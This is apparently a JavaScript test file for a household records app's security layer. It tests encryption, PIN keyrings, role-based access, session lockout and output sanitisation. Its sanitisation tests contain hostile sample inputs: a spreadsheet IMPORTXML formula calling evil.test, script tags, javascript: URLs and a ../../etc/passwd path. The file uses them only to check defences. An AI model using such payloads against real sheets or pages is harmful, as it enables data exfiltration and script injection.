import { readFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { test, describe, assert, setSuite, fakeStorage, fakeClock } from './harness.mjs';
import { formats } from '../js/data/formats.js';
import { makeDb, makePerson } from './fixture.mjs';
import {
  encryptText, decryptText, isEncrypted, generateDataKey, deriveKeyEncryptionKey,
  wrapDataKey, unwrapDataKey, newSalt, generatePassword, generatePassphrase,
  passwordEntropy, passwordStrength, timingSafeEqual, toBase64, fromBase64,
} from '../js/security/crypto.js';
import { Keyring } from '../js/security/keyring.js';
import {
  can, assertCan, rowFilter, visibleEntities, visibleModules, atLeast, SUBJECT_FIELD,
} from '../js/security/rbac.js';
import { validate } from '../js/data/validate.js';
import { Session, AttemptLimiter, memoryStorage } from '../js/security/session.js';
import {
  escapeForSheet, unescapeFromSheet, escapeCsv, stripTags, safeUrl, safeFileName,
} from '../js/security/sanitize.js';
import { modules, entitiesOfModule, entityNames, ROLES } from '../js/data/schema.js';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');

setSuite('security');

/** A meta store backed by a Map, so the keyring can be tested on its own. */
function metaStore() {
  const map = new Map();
  return { get: async (k) => map.get(k) ?? null, set: async (k, v) => void map.set(k, v) };
}

describe('crypto', () => {
  test('a round trip returns exactly what went in', async () => {
    const key = await generateDataKey();
    const secret = 'ABCDE1234F — with unicode ₹ and a newline\n';
    const sealed = await encryptText(key, secret, 'ctx');
    assert.ok(isEncrypted(sealed));
    assert.equal(await decryptText(key, sealed, 'ctx'), secret);
  });

  test('the same plaintext seals differently every time', async () => {
    const key = await generateDataKey();
    const a = await encryptText(key, 'same', 'ctx');
    const b = await encryptText(key, 'same', 'ctx');
    assert.notEqual(a, b, 'a repeated nonce would leak that two fields are equal');
  });

  test('the wrong context will not decrypt', async () => {
    const key = await generateDataKey();
    const sealed = await encryptText(key, 'secret', 'person:1:pan');
    await assert.throws(() => decryptText(key, sealed, 'person:2:pan'));
  });

  test('a tampered ciphertext is rejected, not silently mangled', async () => {
    const key = await generateDataKey();
    const sealed = await encryptText(key, 'secret', 'ctx');
    const [prefix, iv, ct] = [sealed.slice(0, 7), ...sealed.slice(7).split(':')];
    const bytes = fromBase64(ct);
    bytes[0] ^= 0xff;
    await assert.throws(() => decryptText(key, `${prefix}${iv}:${toBase64(bytes)}`, 'ctx'));
  });

  test('clear text passes through decrypt untouched', async () => {
    const key = await generateDataKey();
    assert.equal(await decryptText(key, 'not sealed'), 'not sealed');
  });

  test('a data key wraps and unwraps under a derived key', async () => {
    const dataKey = await generateDataKey();
    const salt = newSalt();
    const kek = await deriveKeyEncryptionKey('1234', salt, 1000);
    const wrapped = await wrapDataKey(dataKey, kek);

    const same = await deriveKeyEncryptionKey('1234', salt, 1000);
    const recovered = await unwrapDataKey(wrapped, same);
    const sealed = await encryptText(dataKey, 'x', 'c');
    assert.equal(await decryptText(recovered, sealed, 'c'), 'x');
  });

  test('the wrong PIN fails to unwrap', async () => {
    const dataKey = await generateDataKey();
    const salt = newSalt();
    const wrapped = await wrapDataKey(dataKey, await deriveKeyEncryptionKey('1234', salt, 1000));
    const wrong = await deriveKeyEncryptionKey('1235', salt, 1000);
    await assert.throws(() => unwrapDataKey(wrapped, wrong));
  });

  test('base64 survives arbitrary bytes', () => {
    const bytes = new Uint8Array(1000).map((_, i) => (i * 37) % 256);
    assert.deep([...fromBase64(toBase64(bytes))], [...bytes]);
  });

  test('generated passwords honour the requested set', () => {
    const p = generatePassword({ length: 32, symbols: false });
    assert.equal(p.length, 32);
    assert.not(/[^a-zA-Z0-9]/.test(p));
    assert.not(/[Il1O0]/.test(p), 'ambiguous characters are excluded by default');
  });

  test('generated passwords do not repeat', () => {
    const seen = new Set(Array.from({ length: 500 }, () => generatePassword({ length: 16 })));
    assert.equal(seen.size, 500);
  });

  test('a passphrase has the requested number of words', () => {
    assert.length(generatePassphrase(5).split('-'), 5);
  });

  test('entropy discounts a repeated character', () => {
    assert.ok(passwordEntropy('aaaaaaaaaaaa') < passwordEntropy('correcthorse'));
    assert.equal(passwordStrength('').score, 0);
    assert.ok(passwordStrength(generatePassword({ length: 20 })).score >= 3);
  });

  test('constant-time compare still compares correctly', () => {
    assert.ok(timingSafeEqual('abc', 'abc'));
    assert.not(timingSafeEqual('abc', 'abd'));
    assert.not(timingSafeEqual('abc', 'abcd'));
    assert.not(timingSafeEqual('abc', null));
  });
});

describe('keyring', () => {
  test('enrolling twice would orphan the first key, so it is refused', async () => {
    const ring = new Keyring(metaStore(), 1000);
    await ring.enrolPin('482913');
    await assert.throws(() => ring.enrolPin('999111'), 'already has a data key');
  });

  test('a weak PIN is refused', async () => {
    const ring = new Keyring(metaStore(), 1000);
    await assert.throws(() => ring.enrolPin('111'), '4 to 12 digits');
    await assert.throws(() => ring.enrolPin('1111'), 'repeated digit');
    await assert.throws(() => ring.enrolPin('1234'), 'consecutive');
    await assert.throws(() => ring.enrolPin('abc'), '4 to 12 digits');
  });

  test('locking really removes the ability to decrypt', async () => {
    const ring = new Keyring(metaStore(), 1000);
    await ring.enrolPin('482913');
    assert.ok(ring.isUnlocked);
    ring.lock();
    assert.not(ring.isUnlocked);
    assert.throws(() => ring.key, 'locked');
  });

  test('changing the PIN does not re-encrypt anything', async () => {
    const meta = metaStore();
    const ring = new Keyring(meta, 1000);
    await ring.enrolPin('482913');
    const sealed = await encryptText(ring.key, 'passport number', 'ctx');

    await ring.changePin('482913', '739205');
    ring.lock();
    await ring.unlockWithPin('739205');
    assert.equal(await decryptText(ring.key, sealed, 'ctx'), 'passport number',
      'the data key must survive a PIN change');
  });

  test('the old PIN stops working after a change', async () => {
    const ring = new Keyring(metaStore(), 1000);
    await ring.enrolPin('482913');
    await ring.changePin('482913', '739205');
    ring.lock();
    await assert.throws(() => ring.unlockWithPin('482913'), 'not right');
  });

  test('a recovery phrase unlocks the same data key', async () => {
    const ring = new Keyring(metaStore(), 1000);
    await ring.enrolPin('482913');
    const sealed = await encryptText(ring.key, 'secret', 'ctx');
    await ring.createRecoveryKey('amber-anchor-basil-cedar-coral');

    ring.lock();
    await ring.unlockWithRecoveryPhrase('amber-anchor-basil-cedar-coral');
    assert.equal(await decryptText(ring.key, sealed, 'ctx'), 'secret');
  });

  test('a second unlock method wraps the same key', async () => {
    const ring = new Keyring(metaStore(), 1000);
    await ring.enrolPin('482913');
    const sealed = await encryptText(ring.key, 'secret', 'ctx');

    const rawKey = new Uint8Array(32).fill(7);
    await ring.addMethod('webauthn', { rawKey, label: 'Fingerprint' });
    ring.lock();
    await ring.unlockWithRawKey(rawKey);
    assert.equal(await decryptText(ring.key, sealed, 'ctx'), 'secret');
    assert.length(await ring.methods(), 2);
  });

  test('the last unlock method cannot be removed', async () => {
    const ring = new Keyring(metaStore(), 1000);
    await ring.enrolPin('482913');
    await assert.throws(() => ring.removeMethod('pin'), 'last unlock method');
  });
});

describe('roles', () => {
  const owner = { personId: 'p1', role: 'owner' };
  const adult = { personId: 'p2', role: 'adult' };
  const child = { personId: 'p3', role: 'child' };
  const guest = { personId: 'p4', role: 'guest' };

  test('rank order runs owner to guest', () => {
    assert.ok(atLeast('owner', 'adult'));
    assert.not(atLeast('child', 'adult'));
    assert.ok(atLeast('adult', 'adult'));
  });

  test('only owners touch the vault', () => {
    assert.ok(can(owner, 'write', 'vaultItem'));
    assert.not(can(adult, 'read', 'vaultItem'));
    assert.not(can(child, 'read', 'vaultItem'));
  });

  test('an adult may record spending but not rewrite identity documents', () => {
    assert.ok(can(adult, 'read', 'transaction'));
    assert.not(can(adult, 'write', 'transaction'), 'money is owner-and-spouse only');
    assert.not(can(adult, 'read', 'identityDocument'));
  });

  test('a child sees their own health record and nobody else', () => {
    const mine = { person: 'p3', title: 'Check-up' };
    const theirs = { person: 'p9', title: 'Check-up' };
    assert.ok(can(child, 'read', 'healthRecord', mine));
    assert.not(can(child, 'read', 'healthRecord', theirs));
  });

  test('a guest sees emergency contacts and nothing else', () => {
    assert.ok(can(guest, 'read', 'emergencyContact'));
    assert.not(can(guest, 'read', 'person'));
    assert.not(can(guest, 'write', 'emergencyContact'));
  });

  test('the row filter excludes rows rather than fetching and hiding them', () => {
    const keep = rowFilter(child, 'task');
    assert.ok(keep({ assignee: 'p3' }));
    assert.not(keep({ assignee: 'p1' }));
    assert.not(rowFilter(guest, 'transaction')({}));
  });

  test('an account not yet matched to a person is about nothing', () => {
    // Records built through the real validator, because the fault was two
    // empty strings meeting: `validate.js` normalises an optional `ref` left
    // blank to `''`, and an account the owner has not matched to a person
    // carries `personId: ''`. Inventing the record here would have tested a
    // shape nobody stores.
    const unbound = { personId: '', role: 'child' };
    const task = validate('task', { title: 'Buy milk', status: 'todo' }).record;
    assert.equal(task.assignee, '', 'the validator no longer blanks an unset ref');

    assert.not(can(unbound, 'read', 'task', task));
    assert.not(can(unbound, 'write', 'task', task),
      'an unassigned task was writable by an account with no identity');

    const health = validate('healthRecord', { title: 'Scan', kind: 'report' }).record;
    assert.equal(health.person, '');
    assert.not(can(unbound, 'write', 'healthRecord', health),
      'a health record naming nobody was writable by an account naming nobody');
  });

  test('and no own-record entity lets an unbound account in', () => {
    // Derived from the one table rather than a list of entities to keep in
    // step with it. Every entry is a (role, entity) pair the backend's
    // `ownRecordAllows` has always refused for an empty personId.
    const unbound = { personId: '', role: 'child' };
    for (const [name, field] of Object.entries(SUBJECT_FIELD)) {
      const blank = { [field]: '' };
      assert.not(can(unbound, 'read', name, blank), `${name} was readable`);
      assert.not(can(unbound, 'write', name, blank), `${name} was writable`);
      assert.not(rowFilter(unbound, name)(blank), `${name} survived the list filter`);
    }
  });

  test('matching the account to a person is what grants their own rows', () => {
    // The other direction: the guard must not have shut the door on the
    // access it exists to allow. Before the fix this pair ran backwards —
    // the unbound account saw more than the bound one.
    const bound = { personId: 'p3', role: 'child' };
    const mine = validate('task', { title: 'Homework', status: 'todo', assignee: 'p3' }).record;
    const theirs = validate('task', { title: 'Homework', status: 'todo', assignee: 'p9' }).record;
    assert.ok(can(bound, 'read', 'task', mine));
    assert.not(can(bound, 'read', 'task', theirs));
    assert.ok(rowFilter(bound, 'task')(mine));
    assert.not(rowFilter(bound, 'task')(theirs));
  });

  test('and the repository is where that is enforced, not the predicate', async () => {
    /*
     * `can()` returning false proves the function works and says nothing
     * about the application. Measured through the real door, before the
     * guard existed:
     *
     *     unbound child list()   → 1 row
     *     unbound child update() → ALLOWED
     *
     * A task the household made, listed and rewritten by an account the
     * owner had never matched to anybody.
     */
    const db = await makeDb({ role: 'owner', personId: 'per_owner' });
    const made = await db.repo('task').create({ title: 'Buy milk', status: 'todo' });
    assert.equal(made.assignee, '', 'the fixture no longer stores a blank ref');

    db.setActor({ personId: '', role: 'child' });
    assert.length(await db.repo('task').list(), 0, 'an unbound account listed the row');
    await assert.throws(
      () => db.repo('task').update(made.id, { title: 'Buy biscuits' }),
      'permission',
    );
  });

  test('an unknown role is refused everything', () => {
    assert.not(can({ personId: 'x', role: 'admin' }, 'read', 'person'));
    assert.not(can(null, 'read', 'person'));
  });

  test('the navigation a guest sees is almost empty', () => {
    const seen = visibleModules(guest, modules).map((m) => m.id);
    assert.includes(seen, 'emergency');
    assert.not(seen.includes('finance'));
    assert.ok(visibleEntities(owner).length > visibleEntities(guest).length);
  });

  test('a module lists exactly the entities that name it', () => {
    // These were written twice — once as `module:` on the entity, once as an
    // array here — and the copies drifted. `economicEvent`, `staff` and
    // `staffLeave` named a module that did not list them back.
    const listed = modules.flatMap((m) => m.entities);
    assert.equal(listed.length, new Set(listed).size);
    assert.equal([...listed].sort().join(','), entityNames().slice().sort().join(','));
    for (const m of modules) {
      assert.equal(m.entities.join(','), entitiesOfModule(m.id).map((e) => e.name).join(','));
    }
  });

  test('a role that can read any of a module\'s entities sees the module', () => {
    // This passes with the drifted lists too, because every role that could
    // read `staff` could also read `relationship`. It is here for the case
    // where that stops being true, which is when the drift would have cost
    // somebody a screen rather than merely being wrong.
    for (const m of modules) {
      const members = entitiesOfModule(m.id).map((e) => e.name);
      for (const role of ROLES) {
        const actor = { personId: 'p1', role };
        const readable = members.filter((name) => can(actor, 'read', name));
        if (!readable.length) continue;
        assert.includes(
          visibleModules(actor, modules).map((x) => x.id),
          m.id,
          `${role} can read ${readable.join(', ')} but is not shown ${m.id}`,
        );
      }
    }
  });

  test('a refused write throws rather than returning false', () => {
    assert.throws(() => assertCan(child, 'write', 'transaction'), 'permission');
  });

  test('the repository refuses a write the role may not make', async () => {
    const db = await makeDb({ role: 'child', personId: 'p3' });
    await assert.throws(
      () => db.repo('transaction').create({
        date: '2025-06-01', kind: 'expense', amount: '100', account: 'acc_1',
      }),
      'permission',
    );
  });

  test('a child cannot read another person record through the repository', async () => {
    const db = await makeDb({ role: 'owner', personId: 'p1' });
    const other = await makePerson(db, { name: 'Someone Else' });
    db.setActor({ personId: 'p3', role: 'child' });
    await assert.throws(() => db.repo('person').get(other.id), 'permission');
  });
});

describe('session', () => {
  test('expires only after the idle period, measured from real activity', () => {
    const clock = fakeClock();
    let expired = false;
    const s = new Session({ timeoutMinutes: 15, clock, onExpire: () => { expired = true; } });
    s.start();

    clock.advance(14 * 60_000);
    s.tick();
    assert.not(expired);

    clock.advance(2 * 60_000);
    s.tick();
    assert.ok(expired, 'sixteen idle minutes must lock a fifteen-minute session');
    s.stop();
  });

  test('interaction pushes the deadline out', () => {
    const clock = fakeClock();
    const s = new Session({ timeoutMinutes: 15, clock });
    s.start();
    clock.advance(14 * 60_000);
    s.touch();
    clock.advance(14 * 60_000);
    assert.ok(s.remainingMs > 0, 'a touch at minute fourteen must reset the clock');
    s.stop();
  });
});

describe('attempt limiting', () => {
  test('locks out after the fifth wrong PIN', () => {
    const clock = fakeClock();
    const limiter = new AttemptLimiter({ max: 5, lockoutSeconds: 60, storage: memoryStorage(), clock });
    for (let i = 0; i < 4; i++) limiter.recordFailure();
    limiter.assertAllowed();
    limiter.recordFailure();
    assert.throws(() => limiter.assertAllowed(), 'too many attempts');
  });

  test('the lockout doubles each round', () => {
    const clock = fakeClock();
    const limiter = new AttemptLimiter({ max: 2, lockoutSeconds: 60, storage: memoryStorage(), clock });
    limiter.recordFailure(); limiter.recordFailure();
    assert.equal(limiter.lockedForMs(), 60_000);

    clock.advance(60_000);
    limiter.recordFailure(); limiter.recordFailure();
    assert.equal(limiter.lockedForMs(), 120_000, 'a second lockout lasts twice as long');
  });

  test('the lockout survives a reload', () => {
    const clock = fakeClock();
    const storage = fakeStorage();
    const first = new AttemptLimiter({ max: 1, lockoutSeconds: 60, storage, clock });
    first.recordFailure();

    const second = new AttemptLimiter({ max: 1, lockoutSeconds: 60, storage, clock });
    assert.ok(second.lockedForMs() > 0, 'closing the tab must not clear the lockout');
  });

  test('a success clears the count', () => {
    const limiter = new AttemptLimiter({ max: 5, storage: memoryStorage() });
    limiter.recordFailure();
    limiter.recordSuccess();
    assert.equal(limiter.attemptsLeft, 5);
  });
});

describe('output safety', () => {
  test('a formula in a payee name is defused for the sheet', () => {
    assert.equal(escapeForSheet('=IMPORTXML("http://evil.test","//x")'),
      '\'=IMPORTXML("http://evil.test","//x")');
    assert.equal(escapeForSheet('+91 98765'), "'+91 98765");
    assert.equal(escapeForSheet('Reliance Fresh'), 'Reliance Fresh');
  });

  test('the sheet escape round-trips', () => {
    for (const value of ['=SUM(A1)', '-5', '@handle', 'plain', '']) {
      assert.equal(unescapeFromSheet(escapeForSheet(value)), value);
    }
  });

  test('a CSV field with a comma or quote is quoted', () => {
    assert.equal(escapeCsv('a,b'), '"a,b"');
    assert.equal(escapeCsv('say "hi"'), '"say ""hi"""');
    assert.equal(escapeCsv('plain'), 'plain');
    assert.equal(escapeCsv('=cmd'), "'=cmd", 'the formula guard applies to CSV too');
  });

  test('a script tag does not survive stripping', () => {
    assert.equal(stripTags('<script>alert(1)</script>hello'), 'hello');
    assert.equal(stripTags('<b>bold</b> text'), 'bold text');
  });

  test('a script URL is refused', () => {
    assert.equal(safeUrl('javascript:alert(1)'), '');
    assert.equal(safeUrl('  JavaScript:alert(1)'), '');
    assert.equal(safeUrl('https://example.com'), 'https://example.com');
    assert.equal(safeUrl('mailto:a@b.com'), 'mailto:a@b.com');
  });

  test('and something actually calls it', () => {
    /*
     * The half that was missing.
     *
     * `safeUrl` was written, exported and tested — and imported by nothing.
     * `js/modules/crud.js` rendered a stored `url` field straight into an
     * anchor's href. The form path *is* defended: `data/formats.js` refuses
     * `javascript:` and `data:` when a URL is typed in. But that is not the
     * only way a value gets into the store — `Repository.applyRemote` writes
     * a row arriving from the household's own spreadsheet with no validation
     * at all, on purpose, because a sync that rejected a row would lose it.
     *
     * A test of a function nothing calls proves the function works and says
     * nothing about the application.
     */
    const crud = readFileSync(join(ROOT, 'js/modules/crud.js'), 'utf8');
    assert.includes(crud, 'safeUrl');
    const anchor = crud.slice(crud.indexOf("field.type === 'url'"));
    const line = anchor.slice(0, anchor.indexOf('}\n  }') + 1);
    assert.not(/href: value\b/.test(line), 'crud.js still puts a stored value straight in an href');
  });

  test('the write path refuses what the render path refuses', () => {
    // Two defences, one rule. If `formats.js` started allowing a scheme that
    // `safeUrl` strips, a link would validate on entry and then render inert,
    // which looks like the application losing the value.
    for (const bad of ['javascript:alert(1)', 'data:text/html,x']) {
      assert.equal(safeUrl(bad), '', bad);
      assert.not(formats.url.test(bad), `formats.url accepted ${bad}`);
    }
    for (const good of ['https://example.com', 'http://example.com']) {
      assert.equal(safeUrl(good), good);
      assert.ok(formats.url.test(good), `formats.url rejected ${good}`);
    }
  });

  test('a filename cannot escape its folder', () => {
    assert.not(safeFileName('../../etc/passwd').includes('/'));
    assert.equal(safeFileName(''), 'file');
    assert.ok(safeFileName('Passport — Asha.pdf').length > 0);
  });
});

/* ------------------------------------------------- somebody who works here */

describe('a member of household staff', () => {
  /** A household with an owner, a cook, and records belonging to each. */
  const withStaff = async () => {
    const db = await makeDb();
    const owner = await makePerson(db, { name: 'Owner', role: 'owner' });
    const cook = await makePerson(db, { name: 'Cook', role: 'staff' });

    const employment = await db.repo('staff').create({
      person: cook.id, role: 'Cook', startedOn: '2026-01-01', monthlyPay: 25_000_00,
    });
    const other = await makePerson(db, { name: 'Gardener', role: 'staff' });
    const otherEmployment = await db.repo('staff').create({
      person: other.id, role: 'Gardener', startedOn: '2026-02-01',
    });
    await db.repo('healthRecord').create({
      person: owner.id, date: '2026-08-01', kind: 'consultation', title: 'Private',
    });

    return { db, owner, cook, employment, other, otherEmployment };
  };

  test('is a role the schema knows about', () => {
    assert.ok(ROLES.includes('staff'));
    // Last, so `atLeast` ranks them below a guest rather than above one.
    assert.not(atLeast('staff', 'guest'));
    assert.ok(atLeast('owner', 'staff'));
  });

  test('can read the employment record that is about them', async () => {
    const { db, cook, employment } = await withStaff();
    db.setActor({ personId: cook.id, role: 'staff' });

    const mine = await db.repo('staff').get(employment.id);
    assert.ok(mine, 'somebody could not see their own employment record');
    assert.equal(mine.role, 'Cook');
  });

  test('and cannot read anybody else’s', async () => {
    const { db, cook, otherEmployment } = await withStaff();
    db.setActor({ personId: cook.id, role: 'staff' });

    const theirs = await db.repo('staff').get(otherEmployment.id).catch(() => null);
    assert.not(theirs, 'one member of staff could read another’s record');
  });

  test('a list returns only their own row, filtered by the query', async () => {
    // Filtered rather than fetched-and-hidden: the rows must not be read off
    // disk at all.
    const { db, cook } = await withStaff();
    db.setActor({ personId: cook.id, role: 'staff' });

    const rows = await db.repo('staff').list({ limit: 50 });
    assert.length(rows, 1);
    assert.equal(rows[0].person, cook.id);
  });

  test('and the household’s own records are not visible at all', async () => {
    // The thing that made showing somebody their record impossible before:
    // there was no way to do it without handing over everything.
    const { db, cook } = await withStaff();
    db.setActor({ personId: cook.id, role: 'staff' });

    assert.length(await db.repo('healthRecord').list({ limit: 50 }), 0);
    assert.length(await db.repo('transaction').list({ limit: 50 }), 0);
    assert.length(await db.repo('account').list({ limit: 50 }), 0);
  });

  test('they can see themselves, and not the rest of the household', async () => {
    const { db, cook } = await withStaff();
    db.setActor({ personId: cook.id, role: 'staff' });

    const people = await db.repo('person').list({ limit: 50 });
    assert.length(people, 1);
    assert.equal(people[0].id, cook.id);
  });

  test('writing anything of the household’s is refused', async () => {
    const { db, cook } = await withStaff();
    db.setActor({ personId: cook.id, role: 'staff' });

    let threw = false;
    try {
      await db.repo('account').create({ name: 'Theirs', kind: 'savings' });
    } catch { threw = true; }
    assert.ok(threw, 'a staff role created a household account');
  });

  test('their leave is not visible, and that is a stated limit', async () => {
    // Row-level filtering needs the subject named on the row, and a leave row
    // names the employment record. Denormalising a `person` column onto it to
    // make this work would be a second copy of who a leave belongs to.
    const { db, cook, employment } = await withStaff();
    await db.repo('staffLeave').create({
      staff: employment.id, from: '2026-03-01', to: '2026-03-05', kind: 'leave', paid: true,
    });

    db.setActor({ personId: cook.id, role: 'staff' });
    assert.length(await db.repo('staffLeave').list({ limit: 50 }), 0,
      'if this starts passing, docs/OWN_RECORDS.md and rbac.js both need changing');
  });

  test('the backend policy agrees, because it is generated from this one', async () => {
    // Two tables describing one set of permissions will disagree. The client
    // list is the source and `tools/policy.mjs` writes the server's copy.
    const { readFileSync } = await import('node:fs');
    const generated = readFileSync(
      new URL('../apps-script/Policy.gs', import.meta.url), 'utf8',
    );
    assert.ok(/['"]staff['"]/.test(generated),
      'the backend policy does not know about the staff role');
  });
});

describe('showing somebody what is held about them', () => {
  test('lists exactly what the role permits, and nothing else', async () => {
    // Filtered through the real `rowFilter`, so this cannot drift from what
    // the role actually allows. A second hand-written idea of "what staff may
    // see" would be a second answer to one question.
    const { RecordsService } = await import('../js/services/records.js');
    const db = await makeDb();

    const owner = await makePerson(db, { name: 'Owner', role: 'owner' });
    const cook = await makePerson(db, { name: 'Cook', role: 'staff' });
    const employment = await db.repo('staff').create({
      person: cook.id, role: 'Cook', startedOn: '2026-01-01',
    });
    await db.repo('healthRecord').create({
      person: owner.id, date: '2026-08-01', kind: 'consultation', title: 'Private',
    });
    await db.repo('staffLeave').create({
      staff: employment.id, from: '2026-03-01', to: '2026-03-05', kind: 'leave', paid: true,
    });

    const held = await new RecordsService(db).whatIsHeldAbout(cook.id);
    const shown = JSON.stringify(held.held);

    assert.includes(shown, 'Cook');
    assert.not(shown.includes('Private'), 'the household’s own records were shown');
    assert.not(shown.includes('Owner'), 'another person was shown');
  });

  test('and names what is held but not shown, rather than omitting it', async () => {
    // A list of what somebody may see is only half an answer to "what do you
    // hold about me". The household holds their leave and the role cannot
    // reach it, so the answer says so.
    const { RecordsService } = await import('../js/services/records.js');
    const db = await makeDb();
    const cook = await makePerson(db, { name: 'Cook', role: 'staff' });
    await db.repo('staff').create({ person: cook.id, role: 'Cook', startedOn: '2026-01-01' });

    const held = await new RecordsService(db).whatIsHeldAbout(cook.id);
    assert.ok(held.notShown.length, 'nothing was admitted to be held but unseen');
    // The schema calls them Absences. Asserted by the label the schema gives
    // rather than the word I expected, so a rename shows up here as a change
    // to make rather than a test quietly matching nothing.
    const { entity } = await import('../js/data/schema.js');
    assert.includes(held.notShown, entity('staffLeave').labels.many);
  });

  test('somebody with nothing held about them gets an empty answer, not an error', async () => {
    const { RecordsService } = await import('../js/services/records.js');
    const db = await makeDb();
    const held = await new RecordsService(db).whatIsHeldAbout('per_nobody');
    assert.length(held.held, 0);
  });
});
